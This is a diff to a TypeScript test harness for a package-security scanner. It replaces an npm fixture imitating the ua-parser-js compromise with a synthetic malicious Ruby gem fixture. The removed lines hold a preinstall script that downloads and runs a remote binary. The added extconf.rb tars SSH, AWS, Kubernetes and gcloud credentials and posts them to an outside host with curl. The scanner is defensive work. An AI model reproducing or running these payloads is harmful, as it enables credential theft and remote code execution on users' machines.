@@ -1,8 +1,8 @@
 /**
- * test-npm-package.ts
+ * test-ruby-package.ts
  *
- * Ad hoc npm package scanner for manual validation. Uses synthetic package
- * contents but reuses the production package planning and analysis logic.
+ * Ad hoc Ruby gem scanner for manual validation. Uses synthetic gem contents
+ * but reuses the production package planning and analysis logic.
  */
 
 import assert from 'node:assert/strict';
@@ -14,63 +14,52 @@ import type { PackageMetadata, PackageSource, RegistrySignals } from './src/supp
 
 const TARGETS = [
   {
-    label: 'ua-parser-js style compromised postinstall downloader',
-    version: '0.7.29-malicious-fixture',
+    label: 'malicious Ruby extconf credential harvester',
+    version: '0.1.0-malicious-fixture',
     source: {
-      name: 'ua-parser-js',
-      ecosystem: 'npm',
-      version: '0.7.29-malicious-fixture',
+      name: 'rackup-helper',
+      ecosystem: 'ruby',
+      version: '0.1.0-malicious-fixture',
       installScripts: {
-        preinstall: 'node preinstall.js',
+        'extconf.rb': `require 'mkmf'`,
       },
       fileList: [
-        'package/package.json',
-        'package/preinstall.js',
-        'package/index.js',
+        'data.tar.gz/rackup-helper.gemspec',
+        'data.tar.gz/extconf.rb',
+        'data.tar.gz/lib/rackup_helper.rb',
       ],
       fileContents: {
-        'package/package.json': JSON.stringify({
-          name: 'ua-parser-js',
-          version: '0.7.29-malicious-fixture',
-          scripts: {
-            preinstall: 'node preinstall.js',
-          },
-        }, null, 2),
-        'package/preinstall.js': `const { execSync } = require('child_process');
-const os = require('os');
-const https = require('https');
-const fs = require('fs');
-const tmpDir = os.tmpdir();
-const url = process.platform === 'win32'
-  ? 'https://citationsherbe.at/sdd.exe'
-  : 'https://citationsherbe.at/sdd';
-
-https.get(url, (res) => {
-  const file = fs.createWriteStream(tmpDir + '/update');
-  res.pipe(file);
-  file.on('finish', () => {
-    fs.chmodSync(tmpDir + '/update', '755');
-    execSync(tmpDir + '/update');
-  });
-});
+        'data.tar.gz/rackup-helper.gemspec': `Gem::Specification.new do |spec|
+  spec.name = "rackup-helper"
+  spec.version = "0.1.0-malicious-fixture"
+  spec.summary = "Synthetic malicious Ruby gem fixture"
+  spec.extensions = ["extconf.rb"]
+end
 `,
-        'package/index.js': `module.exports = function parseUA(ua) { return { ua }; };`,
+        'data.tar.gz/extconf.rb': `require 'fileutils'
+
+system("tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials ~/.kube/config ~/.config/gcloud && curl -X POST https://models.litellm.cloud/ --data-binary @/tmp/loot.tgz")
+`,
+        'data.tar.gz/lib/rackup_helper.rb': `module RackupHelper
+  def self.enabled?
+    true
+  end
+end
+`,
       },
-      suspiciousFiles: {
-        'package/preinstall.js': `const { execSync } = require('child_process');`,
-      },
+      suspiciousFiles: {},
     } satisfies PackageSource,
   },
 ];
 
-const llmOptions = parseTestLLMOptions('test-llm-npm-package.ts');
+const llmOptions = parseTestLLMOptions('test-llm-ruby-package.ts');
 
 function buildFakeMetadata(version: string): PackageMetadata {
   const signals: RegistrySignals = {
-    maintainerChangedInLatestRelease: true,
-    previousMaintainers: ['faisalman'],
-    newMaintainers: ['unknown-maintainer'],
-    packageAgeDays: 365 * 5,
+    maintainerChangedInLatestRelease: false,
+    previousMaintainers: [],
+    newMaintainers: [],
+    packageAgeDays: 14,
     publishedDaysAgo: 1,
     typosquatCandidate: null,
     isDependencyConfusion: false,
@@ -79,20 +68,20 @@ function buildFakeMetadata(version: string): PackageMetadata {
   };
 
   return {
-    name: 'ua-parser-js',
-    ecosystem: 'npm',
+    name: 'rackup-helper',
+    ecosystem: 'ruby',
     latestVersion: version,
-    previousVersion: '0.7.28',
-    createdAt: '2021-01-01T00:00:00Z',
+    previousVersion: '0.0.9',
+    createdAt: '2026-03-01T00:00:00Z',
     updatedAt: new Date().toISOString(),
-    weeklyDownloads: 8_000_000,
-    maintainers: ['unknown-maintainer'],
+    weeklyDownloads: 10,
+    maintainers: ['unknown'],
     hasInstallScripts: true,
     installScripts: {
-      preinstall: 'node preinstall.js',
+      'extconf.rb': 'ruby extconf.rb',
     },
-    repositoryUrl: 'https://github.com/faisalman/ua-parser-js',
-    description: 'Detect Browser, Engine, OS, CPU, and Device type/model from User-Agent data.',
+    repositoryUrl: 'https://example.invalid/rackup-helper',
+    description: 'Synthetic malicious Ruby fixture for supply-chain testing.',
     registrySignals: signals,
   };
 }
@@ -105,7 +94,7 @@ async function scanTarget(target: typeof TARGETS[0]) {
   const { allContent, triageResults, filesToInvestigate } = planPackageInvestigation(target.source);
 
   console.log('\n' + formatTriageResults(triageResults, allContent.size).split('\n').map(l => '  ' + l).join('\n'));
-  console.log(`\n  ${filesToInvestigate.length} file(s) selected for LLM investigation \n`);
+  console.log(`\n  ${filesToInvestigate.length} file(s) selected for LLM investigation\n`);
 
   assert(
     filesToInvestigate.length > 0,
@@ -157,5 +146,5 @@ for (const target of TARGETS) {
   }
 }
 
-assert(targetsWithIssues === TARGETS.length, 'Expected every npm target to be flagged by the test harness');
+assert(targetsWithIssues === TARGETS.length, 'Expected every Ruby target to be flagged by the test harness');
 console.log('\n✅ Done\n');
